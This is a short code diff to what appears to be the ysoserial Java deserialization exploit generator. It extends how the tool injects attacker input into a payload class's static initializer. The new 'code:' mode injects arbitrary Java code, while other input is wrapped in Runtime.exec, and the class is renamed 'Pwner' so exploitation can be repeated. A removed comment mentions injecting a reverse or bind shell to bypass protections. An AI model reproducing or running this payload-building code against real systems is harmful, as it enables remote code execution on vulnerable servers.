@@ -111,11 +111,18 @@ public class Gadgets {
         pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
         pool.insertClassPath(new ClassClassPath(abstTranslet));
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-        // run command in static initializer
-        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+
+        String cmd="";
+        //如果以code:开头，认为是代码，否则认为是命令
+        if(!command.startsWith("code:")){
+            cmd = "java.lang.Runtime.getRuntime().exec(\"" +
             command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
             "\");";
+        }
+        else{
+            System.err.println("Java Code Mode:"+command.substring(5)); //使用stderr输出，防止影响payload的输出
+            cmd = command.substring(5);
+        }
         clazz.makeClassInitializer().insertAfter(cmd);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
